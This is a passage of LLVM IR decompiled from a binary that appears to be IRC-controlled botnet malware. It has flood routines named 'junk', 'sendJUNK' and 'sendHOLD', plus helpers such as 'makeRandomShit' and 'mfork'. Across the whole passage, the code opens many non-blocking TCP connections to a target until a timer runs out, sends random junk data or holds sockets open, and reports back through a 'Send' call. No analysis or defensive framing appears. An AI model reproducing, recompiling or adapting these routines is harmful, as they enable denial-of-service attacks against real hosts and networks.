  %v1_1000bd9c = or i32 %v3_1000bd94, 2048
  %v0_1000bda0 = load i32, i32* @r29, align 4
  store i32 268484020, i32* @lr, align 4
  %v3_1000bdb0 = call i32 @fcntl(i32 %v0_1000bda0, i32 4, i32 %v1_1000bd9c)
  %v2_1000bdc4 = load i32, i32* %v1_1000bd6c, align 8
  store i32 268484060, i32* @lr, align 4
  %v3_1000bdd8 = call i32 @connect(i32 %v2_1000bdc4, i32 %v2_1000bc00, i32 16)
  %v4_1000bde4 = icmp eq i32 %v3_1000bdd8, -1
  br i1 %v4_1000bde4, label %dec_label_pc_1000bdec, label %dec_label_pc_1000be00

dec_label_pc_1000bdec:                            ; preds = %dec_label_pc_1000bd34
  %v0_1000bdec = call i32 @__errno_location()
  %v1_1000bdf4 = inttoptr i32 %v0_1000bdec to i32*
  %v2_1000bdf4 = load i32, i32* %v1_1000bdf4, align 4
  %v3_1000bdf8 = icmp eq i32 %v2_1000bdf4, 115
  br i1 %v3_1000bdf8, label %dec_label_pc_1000be20, label %dec_label_pc_1000be00

dec_label_pc_1000be00:                            ; preds = %dec_label_pc_1000bd34, %dec_label_pc_1000bdec
  %v2_1000be10 = load i32, i32* %v1_1000bd6c, align 8
  store i32 ptrtoint (i32* @global_var_1000be1c.486 to i32), i32* @lr, align 4
  %v1_1000be18 = call i32 @close(i32 %v2_1000be10)
  br label %dec_label_pc_1000c0cc

dec_label_pc_1000be20:                            ; preds = %dec_label_pc_1000bdec
  store i8 1, i8* %v2_1000bd00, align 4
  br label %dec_label_pc_1000c0cc

dec_label_pc_1000be3c:                            ; preds = %dec_label_pc_1000bcf0
  store i32 %v2_1000be3c, i32* %stack_var_-248, align 4
  store i32 0, i32* %stack_var_-196, align 4
  br label %dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge

dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge: ; preds = %dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge.dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge_crit_edge, %dec_label_pc_1000be3c
  %v3_1000be54.pre = phi i32 [ %v2_1000be3c, %dec_label_pc_1000be3c ], [ %v3_1000be54.pre.pre, %dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge.dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge_crit_edge ]
  %v1_1000be6c47 = phi i32 [ 1, %dec_label_pc_1000be3c ], [ %v1_1000be6c, %dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge.dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge_crit_edge ]
  %v1_1000be58 = mul nuw nsw i32 %v1_1000be6c47, 4
  %v2_1000be5c = add i32 %v1_1000be58, %v3_1000be54.pre
  %v2_1000be64 = inttoptr i32 %v2_1000be5c to i32*
  store i32 0, i32* %v2_1000be64, align 4
  %v1_1000be6c = add nuw nsw i32 %v1_1000be6c47, 1
  %tmp45 = icmp ult i32 %v1_1000be6c, 32
  br i1 %tmp45, label %dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge.dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge_crit_edge, label %dec_label_pc_1000be80

dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge.dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge_crit_edge: ; preds = %dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge
  %v3_1000be54.pre.pre = load i32, i32* %stack_var_-248, align 4
  br label %dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge

dec_label_pc_1000be80:                            ; preds = %dec_label_pc_1000be50.dec_label_pc_1000be50_crit_edge
  %v1_1000be90 = inttoptr i32 %v2_1000bcfc to i32*
  %v2_1000be90 = load i32, i32* %v1_1000be90, align 8
  %v1_1000be94 = udiv i32 %v2_1000be90, 32
  store i32 %v1_1000be94, i32* @r10, align 4
  %v1_1000be9c = mul nuw nsw i32 %v1_1000be94, 4
  %v1_1000bea8 = add i32 %v2_1000bea4, %v1_1000be9c
  %v1_1000beac = inttoptr i32 %v1_1000bea8 to i32*
  %v2_1000beac = load i32, i32* %v1_1000beac, align 4
  %v2_1000bec0 = load i32, i32* %v1_1000be90, align 8
  %v1_1000bec4 = urem i32 %v2_1000bec0, 32
  %v3_1000becc = shl i32 1, %v1_1000bec4
  %v2_1000bed0 = or i32 %v3_1000becc, %v2_1000beac
  store i32 %v2_1000bed0, i32* %v1_1000beac, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1000bf08 = load i32, i32* %v1_1000be90, align 8
  %v1_1000bf0c = add i32 %v2_1000bf08, 1
  store i32 268484400, i32* @lr, align 4
  %v5_1000bf2c = call i32 @__libc_select(i32 %v1_1000bf0c, i32 0, i32 %v2_1000be3c, i32 0, i32 %v2_1000bf14)
  %v3_1000bf3c = icmp eq i32 %v5_1000bf2c, 1
  br i1 %v3_1000bf3c, label %dec_label_pc_1000bf44, label %dec_label_pc_1000bfe0

dec_label_pc_1000bf44:                            ; preds = %dec_label_pc_1000be80
  store i32 4, i32* %stack_var_-60, align 4
  %v2_1000bf5c = load i32, i32* %v1_1000be90, align 8
  store i32 268484480, i32* @lr, align 4
  %v5_1000bf7c = call i32 @getsockopt(i32 %v2_1000bf5c, i32 1, i32 4, i32 %v2_1000bf60, i32 %v2_1000bf64)
  %v3_1000bf80 = load i32, i32* %stack_var_-56, align 4
  %v3_1000bf84 = icmp eq i32 %v3_1000bf80, 0
  br i1 %v3_1000bf84, label %dec_label_pc_1000bfc4, label %dec_label_pc_1000bf8c

dec_label_pc_1000bf8c:                            ; preds = %dec_label_pc_1000bf44
  %v2_1000bf9c = load i32, i32* %v1_1000be90, align 8
  store i32 268484520, i32* @lr, align 4
  %v1_1000bfa4 = call i32 @close(i32 %v2_1000bf9c)
  store i8 0, i8* %v2_1000bd00, align 4
  br label %dec_label_pc_1000c0cc

dec_label_pc_1000bfc4:                            ; preds = %dec_label_pc_1000bf44
  store i8 2, i8* %v2_1000bd00, align 4
  br label %dec_label_pc_1000c0cc

dec_label_pc_1000bfe0:                            ; preds = %dec_label_pc_1000be80
  %v4_1000bfe8 = icmp eq i32 %v5_1000bf2c, -1
  br i1 %v4_1000bfe8, label %dec_label_pc_1000bff0, label %dec_label_pc_1000c0cc

dec_label_pc_1000bff0:                            ; preds = %dec_label_pc_1000bfe0
  %v2_1000c000 = load i32, i32* %v1_1000be90, align 8
  store i32 268484620, i32* @lr, align 4
  %v1_1000c008 = call i32 @close(i32 %v2_1000c000)
  store i8 0, i8* %v2_1000bd00, align 4
  br label %dec_label_pc_1000c0cc

dec_label_pc_1000c028:                            ; preds = %dec_label_pc_1000bd18
  store i32 268484660, i32* @lr, align 4
  %v2_1000c030 = call i32 @realrand(i32 32, i32 1024)
  store i32 268484680, i32* @lr, align 4
  %v2_1000c044 = call i32 @makeRandomShit(i32 %v0_1000bca4, i32 %v2_1000c030)
  %v1_1000c058 = inttoptr i32 %v2_1000bcfc to i32*
  %v2_1000c058 = load i32, i32* %v1_1000c058, align 8
  store i32 268484724, i32* @lr, align 4
  %v4_1000c070 = call i32 @send(i32 %v2_1000c058, i32 %v0_1000bca4, i32 %v2_1000c030, i32 16384)
  %v4_1000c07c = icmp eq i32 %v4_1000c070, -1
  br i1 %v4_1000c07c, label %dec_label_pc_1000c084, label %dec_label_pc_1000c0cc

dec_label_pc_1000c084:                            ; preds = %dec_label_pc_1000c028
  %v0_1000c084 = call i32 @__errno_location()
  %v1_1000c08c = inttoptr i32 %v0_1000c084 to i32*
  %v2_1000c08c = load i32, i32* %v1_1000c08c, align 4
  %v3_1000c090 = icmp eq i32 %v2_1000c08c, 11
  br i1 %v3_1000c090, label %dec_label_pc_1000c0cc, label %dec_label_pc_1000c098

dec_label_pc_1000c098:                            ; preds = %dec_label_pc_1000c084
  %v2_1000c0a8 = load i32, i32* %v1_1000c058, align 8
  store i32 268484788, i32* @lr, align 4
  %v1_1000c0b0 = call i32 @close(i32 %v2_1000c0a8)
  store i8 0, i8* %v2_1000bd00, align 4
  br label %dec_label_pc_1000c0cc

dec_label_pc_1000c0cc:                            ; preds = %dec_label_pc_1000bd24, %dec_label_pc_1000bfe0, %dec_label_pc_1000c028, %dec_label_pc_1000c084, %dec_label_pc_1000bff0, %dec_label_pc_1000bfc4, %dec_label_pc_1000bf8c, %dec_label_pc_1000be20, %dec_label_pc_1000be00, %dec_label_pc_1000c098
  %v1_1000c0d0 = add nuw nsw i32 %storemerge28, 1
  %v2_1000c0e0 = icmp slt i32 %v1_1000c0d0, %v3_1000bbd4
  br i1 %v2_1000c0e0, label %dec_label_pc_1000bcf0, label %dec_label_pc_1000c0e8.loopexit

dec_label_pc_1000c0e8.loopexit:                   ; preds = %dec_label_pc_1000c0cc, %dec_label_pc_1000c0d8.preheader
  store i32 268484848, i32* @lr, align 4
  %v1_1000c0ec = call i32 @__GI_time(i32 0)
  %v2_1000c0f8 = icmp slt i32 %v1_1000c0ec, %v2_1000bcd8
  br i1 %v2_1000c0f8, label %dec_label_pc_1000c0d8.preheader, label %dec_label_pc_1000c100

dec_label_pc_1000c0d8.preheader:                  ; preds = %dec_label_pc_1000c0d8.preheader.lr.ph, %dec_label_pc_1000c0e8.loopexit
  br i1 %v2_1000c0e05, label %dec_label_pc_1000bcf0, label %dec_label_pc_1000c0e8.loopexit

dec_label_pc_1000c100:                            ; preds = %dec_label_pc_1000c0e8.loopexit, %dec_label_pc_1000bc24, %entry
  %v0_1000c128 = phi i32 [ %v4_1000bc10, %entry ], [ %v1_1000c0ec10, %dec_label_pc_1000bc24 ], [ %v1_1000c0ec, %dec_label_pc_1000c0e8.loopexit ]
  ret i32 %v0_1000c128

; uselistorder directives
  uselistorder i32 %v1_1000c0d0, { 1, 0 }
  uselistorder i32 %v1_1000be6c, { 1, 0 }
  uselistorder i8* %v2_1000bd00, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1000bcfc, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge28, { 2, 0, 1 }
  uselistorder i32 %v2_1000be3c, { 1, 0, 2 }
  uselistorder i32 %v2_1000bcd8, { 1, 0 }
  uselistorder i32 %v2_1000bc00, { 1, 0 }
  uselistorder i32 %v1_1000bbec, { 1, 0 }
  uselistorder i32 %v3_1000bbd4, { 1, 0, 2 }
  uselistorder i32 %v1_1000bbd4, { 1, 0 }
  uselistorder i32 %v0_1000bbcc, { 1, 0 }
  uselistorder i32* %stack_var_-212, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomShit, { 2, 1, 0 }
  uselistorder i32 268484848, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0d8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0e8.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0cc, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_1000be00, { 1, 0 }
}

define i32 @junk(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = icmp slt i32 %arg3, 3
  br i1 %tmp11, label %dec_label_pc_1000c184, label %dec_label_pc_1000c164

dec_label_pc_1000c164:                            ; preds = %entry
  %v1_1000c168 = add i32 %arg4, 12
  %v1_1000c16c = inttoptr i32 %v1_1000c168 to i32*
  %v2_1000c16c = load i32, i32* %v1_1000c16c, align 4
  store i32 268484984, i32* @lr, align 4
  %v1_1000c174 = call i32 @atol(i32 %v2_1000c16c)
  %tmp12 = icmp sgt i32 %v1_1000c174, -1
  br i1 %tmp12, label %dec_label_pc_1000c1a0, label %dec_label_pc_1000c184

dec_label_pc_1000c184:                            ; preds = %dec_label_pc_1000c164, %entry
  %v6_1000c198 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1002bbac.487 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000c23c

dec_label_pc_1000c1a0:                            ; preds = %dec_label_pc_1000c164
  %v1_1000c1a4 = call i32 @mfork(i32 %arg2)
  %v3_1000c1ac = icmp eq i32 %v1_1000c1a4, 0
  br i1 %v3_1000c1ac, label %dec_label_pc_1000c1b4, label %dec_label_pc_1000c23c

dec_label_pc_1000c1b4:                            ; preds = %dec_label_pc_1000c1a0
  %v1_1000c1b8 = add i32 %arg4, 4
  %v1_1000c1bc = inttoptr i32 %v1_1000c1b8 to i32*
  %v2_1000c1bc = load i32, i32* %v1_1000c1bc, align 4
  %v1_1000c1c4 = add i32 %arg4, 8
  %v1_1000c1c8 = inttoptr i32 %v1_1000c1c4 to i32*
  %v7_1000c1e8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002bbd0.489 to i32), i32 %arg2, i32 %v2_1000c1bc)
  %v2_1000c204 = load i32, i32* %v1_1000c1c8, align 4
  store i32 268485136, i32* @lr, align 4
  %v1_1000c20c = call i32 @atol(i32 %v2_1000c204)
  store i32 %v1_1000c20c, i32* @r29, align 4
  %v2_1000c21c = load i32, i32* %v1_1000c16c, align 4
  store i32 268485160, i32* @lr, align 4
  %v1_1000c224 = call i32 @atol(i32 %v2_1000c21c)
  %v0_1000c22c = load i32, i32* @r28, align 4
  %v0_1000c230 = load i32, i32* @r29, align 4
  %v3_1000c238 = call i32 @sendJUNK(i32 %v0_1000c22c, i32 %v0_1000c230, i32 %v1_1000c224)
  br label %dec_label_pc_1000c23c

dec_label_pc_1000c23c:                            ; preds = %dec_label_pc_1000c1a0, %dec_label_pc_1000c184, %dec_label_pc_1000c1b4
  %v0_1000c258 = phi i32 [ %v1_1000c1a4, %dec_label_pc_1000c1a0 ], [ %v6_1000c198, %dec_label_pc_1000c184 ], [ %v3_1000c238, %dec_label_pc_1000c1b4 ]
  ret i32 %v0_1000c258

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c23c, { 2, 0, 1 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000c25c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000c25c, i32* %stack_var_-256, align 4
  store i32 268485260, i32* @lr, align 4
  %v0_1000c288 = call i32 @getdtablesize()
  %v1_1000c290 = udiv i32 %v0_1000c288, 2
  %v2_1000c290 = and i32 %v0_1000c288, -2147483648
  %v3_1000c290 = or i32 %v1_1000c290, %v2_1000c290
  store i32 2, i32* %stack_var_-212, align 4
  %v1_1000c2a8 = urem i32 %arg2, 65536
  store i32 %v1_1000c2a8, i32* @r3, align 4
  %v1_1000c2b0 = call i32 @htons(i32 %v1_1000c2a8)
  %v2_1000c2bc = ptrtoint i32* %stack_var_-212 to i32
  %v4_1000c2cc = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-208, i32 %v2_1000c2bc)
  %v3_1000c2d4 = icmp eq i32 %v4_1000c2cc, 0
  br i1 %v3_1000c2d4, label %dec_label_pc_1000c2e0, label %dec_label_pc_1000c82c

dec_label_pc_1000c2e0:                            ; preds = %entry
  %v2_1000c2e4 = ptrtoint i32* %stack_var_-204 to i32
  store i32 %v2_1000c2e4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268485368, i32* @lr, align 4
  %v0_1000c2f4 = call i32 @__GI_memset()
  %v1_1000c2fc = mul i32 %v1_1000c290, 8
  %v1_1000c304 = add i32 %v1_1000c2fc, 30
  %v1_1000c308 = and i32 %v1_1000c304, -16
  %v2_1000c310 = load i32, i32* %stack_var_-256, align 4
  %v1_1000c318 = load i32, i32* @r1, align 4
  %v3_1000c318 = sub i32 %v1_1000c318, %v1_1000c308
  %v4_1000c318 = inttoptr i32 %v3_1000c318 to i32*
  store i32 %v2_1000c310, i32* %v4_1000c318, align 4
  %v1_1000c328 = add i32 %v3_1000c318, 23
  %v1_1000c32c = and i32 %v1_1000c328, -16
  %v1_1000c348 = mul i32 %v3_1000c290, 5
  store i32 %v1_1000c32c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v1_1000c348, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000c35c.490 to i32), i32* @lr, align 4
  %v0_1000c358 = call i32 @__GI_memset()
  store i32 268485476, i32* @lr, align 4
  %v1_1000c360 = call i32 @__GI_time(i32 0)
  %v2_1000c36c = add i32 %v1_1000c360, %arg3
  store i32 268486684, i32* @lr, align 4
  %v1_1000c81813 = call i32 @__GI_time(i32 0)
  %v2_1000c82414 = icmp slt i32 %v1_1000c81813, %v2_1000c36c
  br i1 %v2_1000c82414, label %dec_label_pc_1000c804.preheader.lr.ph, label %dec_label_pc_1000c82c

dec_label_pc_1000c804.preheader.lr.ph:            ; preds = %dec_label_pc_1000c2e0
  %v2_1000c80c8 = icmp sgt i32 %v3_1000c290, 0
  %v2_1000c4d0 = ptrtoint i32* %stack_var_-196 to i32
  %v2_1000c534 = ptrtoint i32* %stack_var_-248 to i32
  %v2_1000c538 = add i32 %v2_1000c534, 52
  %v2_1000c5a8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1000c5f4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000c5f8 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_1000c804.preheader

dec_label_pc_1000c384:                            ; preds = %dec_label_pc_1000c804.preheader, %dec_label_pc_1000c7f8
  %storemerge311 = phi i32 [ %v1_1000c7fc, %dec_label_pc_1000c7f8 ], [ 0, %dec_label_pc_1000c804.preheader ]
  %v1_1000c38c = mul i32 %storemerge311, 8
  %v2_1000c390 = add i32 %v1_1000c38c, %v1_1000c32c
  %v1_1000c394 = or i32 %v2_1000c390, 4
  %v2_1000c394 = inttoptr i32 %v1_1000c394 to i8*
  %v3_1000c394 = load i8, i8* %v2_1000c394, align 4
  %v1_1000c3a4 = icmp eq i8 %v3_1000c394, 0
  %v3_1000c3a4 = icmp eq i8 %v3_1000c394, 1
  br i1 %v3_1000c3a4, label %dec_label_pc_1000c4d0, label %dec_label_pc_1000c3ac

dec_label_pc_1000c3ac:                            ; preds = %dec_label_pc_1000c384
  %v3_1000c3b0 = icmp eq i8 %v3_1000c394, 2
  br i1 %v3_1000c3b0, label %dec_label_pc_1000c6bc, label %dec_label_pc_1000c3b8

dec_label_pc_1000c3b8:                            ; preds = %dec_label_pc_1000c3ac
  br i1 %v1_1000c3a4, label %dec_label_pc_1000c3c8, label %dec_label_pc_1000c7f8

dec_label_pc_1000c3c8:                            ; preds = %dec_label_pc_1000c3b8
  store i32 268485596, i32* @lr, align 4
  %v3_1000c3d8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000c3e4 = mul i32 %storemerge311, 8
  %v2_1000c3e8 = add i32 %v1_1000c3e4, %v1_1000c32c
  %v2_1000c3ec = inttoptr i32 %v2_1000c3e8 to i32*
  store i32 %v3_1000c3d8, i32* %v2_1000c3ec, align 8
  %v1_1000c400 = inttoptr i32 %v2_1000c390 to i32*
  %v2_1000c414 = load i32, i32* %v1_1000c400, align 8
  store i32 268485676, i32* @lr, align 4
  %v3_1000c428 = call i32 @fcntl(i32 %v2_1000c414, i32 3, i32 0)
  %v1_1000c430 = or i32 %v3_1000c428, 2048
  %v0_1000c434 = load i32, i32* @r29, align 4
  store i32 268485704, i32* @lr, align 4
  %v3_1000c444 = call i32 @fcntl(i32 %v0_1000c434, i32 4, i32 %v1_1000c430)
  %v2_1000c458 = load i32, i32* %v1_1000c400, align 8
  store i32 268485744, i32* @lr, align 4
  %v3_1000c46c = call i32 @connect(i32 %v2_1000c458, i32 %v2_1000c2bc, i32 16)
  %v4_1000c478 = icmp eq i32 %v3_1000c46c, -1
  br i1 %v4_1000c478, label %dec_label_pc_1000c480, label %dec_label_pc_1000c494

dec_label_pc_1000c480:                            ; preds = %dec_label_pc_1000c3c8
  %v0_1000c480 = call i32 @__errno_location()
  %v1_1000c488 = inttoptr i32 %v0_1000c480 to i32*
  %v2_1000c488 = load i32, i32* %v1_1000c488, align 4
  %v3_1000c48c = icmp eq i32 %v2_1000c488, 115
  br i1 %v3_1000c48c, label %dec_label_pc_1000c4b4, label %dec_label_pc_1000c494

dec_label_pc_1000c494:                            ; preds = %dec_label_pc_1000c3c8, %dec_label_pc_1000c480
  %v2_1000c4a4 = load i32, i32* %v1_1000c400, align 8
  store i32 ptrtoint (i32* @global_var_1000c4b0.491 to i32), i32* @lr, align 4
  %v1_1000c4ac = call i32 @close(i32 %v2_1000c4a4)
  br label %dec_label_pc_1000c7f8

dec_label_pc_1000c4b4:                            ; preds = %dec_label_pc_1000c480
  store i8 1, i8* %v2_1000c394, align 4
  br label %dec_label_pc_1000c7f8

dec_label_pc_1000c4d0:                            ; preds = %dec_label_pc_1000c384
  br label %dec_label_pc_1000c4e4

dec_label_pc_1000c4e4:                            ; preds = %dec_label_pc_1000c4d0, %dec_label_pc_1000c4e4
  %storemerge57 = phi i32 [ 0, %dec_label_pc_1000c4d0 ], [ %v1_1000c500, %dec_label_pc_1000c4e4 ]
  %v1_1000c4ec = mul nuw nsw i32 %storemerge57, 4
  %v2_1000c4f0 = add i32 %v1_1000c4ec, %v2_1000c4d0
  %v2_1000c4f8 = inttoptr i32 %v2_1000c4f0 to i32*
  store i32 0, i32* %v2_1000c4f8, align 4
  %v1_1000c500 = add nuw nsw i32 %storemerge57, 1
  %tmp48 = icmp ult i32 %v1_1000c500, 32
  br i1 %tmp48, label %dec_label_pc_1000c4e4, label %dec_label_pc_1000c514

dec_label_pc_1000c514:                            ; preds = %dec_label_pc_1000c4e4
  %v1_1000c524 = inttoptr i32 %v2_1000c390 to i32*
  %v2_1000c524 = load i32, i32* %v1_1000c524, align 8
  %v1_1000c528 = udiv i32 %v2_1000c524, 32
  %v1_1000c530 = mul nuw nsw i32 %v1_1000c528, 4
  %v1_1000c53c = add i32 %v1_1000c530, %v2_1000c538
  %v1_1000c540 = inttoptr i32 %v1_1000c53c to i32*
  %v2_1000c540 = load i32, i32* %v1_1000c540, align 4
  %v1_1000c558 = urem i32 %v2_1000c524, 32
  %v3_1000c560 = shl i32 1, %v1_1000c558
  %v2_1000c564 = or i32 %v3_1000c560, %v2_1000c540
  store i32 %v2_1000c564, i32* %v1_1000c540, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1000c59c = load i32, i32* %v1_1000c524, align 8
  %v1_1000c5a0 = add i32 %v2_1000c59c, 1
  store i32 268486084, i32* @lr, align 4
  %v5_1000c5c0 = call i32 @__libc_select(i32 %v1_1000c5a0, i32 0, i32 %v2_1000c4d0, i32 0, i32 %v2_1000c5a8)
  %v3_1000c5d0 = icmp eq i32 %v5_1000c5c0, 1
  br i1 %v3_1000c5d0, label %dec_label_pc_1000c5d8, label %dec_label_pc_1000c674

dec_label_pc_1000c5d8:                            ; preds = %dec_label_pc_1000c514
  store i32 4, i32* %stack_var_-60, align 4
  %v2_1000c5f0 = load i32, i32* %v1_1000c524, align 8
  store i32 268486164, i32* @lr, align 4
  %v5_1000c610 = call i32 @getsockopt(i32 %v2_1000c5f0, i32 1, i32 4, i32 %v2_1000c5f4, i32 %v2_1000c5f8)
  %v3_1000c614 = load i32, i32* %stack_var_-56, align 4
  %v3_1000c618 = icmp eq i32 %v3_1000c614, 0
  br i1 %v3_1000c618, label %dec_label_pc_1000c658, label %dec_label_pc_1000c620

dec_label_pc_1000c620:                            ; preds = %dec_label_pc_1000c5d8
  %v2_1000c630 = load i32, i32* %v1_1000c524, align 8
  store i32 268486204, i32* @lr, align 4
  %v1_1000c638 = call i32 @close(i32 %v2_1000c630)
  store i8 0, i8* %v2_1000c394, align 4
  br label %dec_label_pc_1000c7f8

dec_label_pc_1000c658:                            ; preds = %dec_label_pc_1000c5d8
  store i8 2, i8* %v2_1000c394, align 4
  br label %dec_label_pc_1000c7f8

dec_label_pc_1000c674:                            ; preds = %dec_label_pc_1000c514
  %v4_1000c67c = icmp eq i32 %v5_1000c5c0, -1
  br i1 %v4_1000c67c, label %dec_label_pc_1000c684, label %dec_label_pc_1000c7f8

dec_label_pc_1000c684:                            ; preds = %dec_label_pc_1000c674
  %v2_1000c694 = load i32, i32* %v1_1000c524, align 8
  store i32 268486304, i32* @lr, align 4
  %v1_1000c69c = call i32 @close(i32 %v2_1000c694)
  store i8 0, i8* %v2_1000c394, align 4
  br label %dec_label_pc_1000c7f8

dec_label_pc_1000c6bc:                            ; preds = %dec_label_pc_1000c3ac
  store i32 %v2_1000c4d0, i32* %stack_var_-248, align 4
  store i32 0, i32* %stack_var_-196, align 4
  br label %dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge

dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge: ; preds = %dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge.dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge_crit_edge, %dec_label_pc_1000c6bc
  %v3_1000c6d4.pre = phi i32 [ %v2_1000c4d0, %dec_label_pc_1000c6bc ], [ %v3_1000c6d4.pre.pre, %dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge.dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge_crit_edge ]
  %v1_1000c6ec51 = phi i32 [ 1, %dec_label_pc_1000c6bc ], [ %v1_1000c6ec, %dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge.dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge_crit_edge ]
  %v1_1000c6d8 = mul nuw nsw i32 %v1_1000c6ec51, 4
  %v2_1000c6dc = add i32 %v1_1000c6d8, %v3_1000c6d4.pre
  %v2_1000c6e4 = inttoptr i32 %v2_1000c6dc to i32*
  store i32 0, i32* %v2_1000c6e4, align 4
  %v1_1000c6ec = add nuw nsw i32 %v1_1000c6ec51, 1
  %tmp49 = icmp ult i32 %v1_1000c6ec, 32
  br i1 %tmp49, label %dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge.dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge_crit_edge, label %dec_label_pc_1000c700

dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge.dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge_crit_edge: ; preds = %dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge
  %v3_1000c6d4.pre.pre = load i32, i32* %stack_var_-248, align 4
  br label %dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge

dec_label_pc_1000c700:                            ; preds = %dec_label_pc_1000c6d0.dec_label_pc_1000c6d0_crit_edge
  %v1_1000c710 = inttoptr i32 %v2_1000c390 to i32*
  %v2_1000c710 = load i32, i32* %v1_1000c710, align 8
  %v1_1000c714 = udiv i32 %v2_1000c710, 32
  %v1_1000c71c = mul nuw nsw i32 %v1_1000c714, 4
  %v1_1000c728 = add i32 %v1_1000c71c, %v2_1000c538
  %v1_1000c72c = inttoptr i32 %v1_1000c728 to i32*
  %v2_1000c72c = load i32, i32* %v1_1000c72c, align 4
  %v1_1000c744 = urem i32 %v2_1000c710, 32
  %v3_1000c74c = shl i32 1, %v1_1000c744
  %v2_1000c750 = or i32 %v3_1000c74c, %v2_1000c72c
  store i32 %v2_1000c750, i32* %v1_1000c72c, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1000c788 = load i32, i32* %v1_1000c710, align 8
  %v1_1000c78c = add i32 %v2_1000c788, 1
  store i32 268486576, i32* @lr, align 4
  %v5_1000c7ac = call i32 @__libc_select(i32 %v1_1000c78c, i32 0, i32 0, i32 %v2_1000c4d0, i32 %v2_1000c5a8)
  %v3_1000c7bc = icmp eq i32 %v5_1000c7ac, 0
  br i1 %v3_1000c7bc, label %dec_label_pc_1000c7f8, label %dec_label_pc_1000c7c4

dec_label_pc_1000c7c4:                            ; preds = %dec_label_pc_1000c700
  %v2_1000c7d4 = load i32, i32* %v1_1000c710, align 8
  store i32 268486624, i32* @lr, align 4
  %v1_1000c7dc = call i32 @close(i32 %v2_1000c7d4)
  store i8 0, i8* %v2_1000c394, align 4
  br label %dec_label_pc_1000c7f8

dec_label_pc_1000c7f8:                            ; preds = %dec_label_pc_1000c3b8, %dec_label_pc_1000c674, %dec_label_pc_1000c700, %dec_label_pc_1000c4b4, %dec_label_pc_1000c494, %dec_label_pc_1000c684, %dec_label_pc_1000c658, %dec_label_pc_1000c620, %dec_label_pc_1000c7c4
  %v1_1000c7fc = add nuw nsw i32 %storemerge311, 1
  %v2_1000c80c = icmp slt i32 %v1_1000c7fc, %v3_1000c290
  br i1 %v2_1000c80c, label %dec_label_pc_1000c384, label %dec_label_pc_1000c814.loopexit

dec_label_pc_1000c814.loopexit:                   ; preds = %dec_label_pc_1000c7f8, %dec_label_pc_1000c804.preheader
  store i32 268486684, i32* @lr, align 4
  %v1_1000c818 = call i32 @__GI_time(i32 0)
  %v2_1000c824 = icmp slt i32 %v1_1000c818, %v2_1000c36c
  br i1 %v2_1000c824, label %dec_label_pc_1000c804.preheader, label %dec_label_pc_1000c82c

dec_label_pc_1000c804.preheader:                  ; preds = %dec_label_pc_1000c804.preheader.lr.ph, %dec_label_pc_1000c814.loopexit
  br i1 %v2_1000c80c8, label %dec_label_pc_1000c384, label %dec_label_pc_1000c814.loopexit

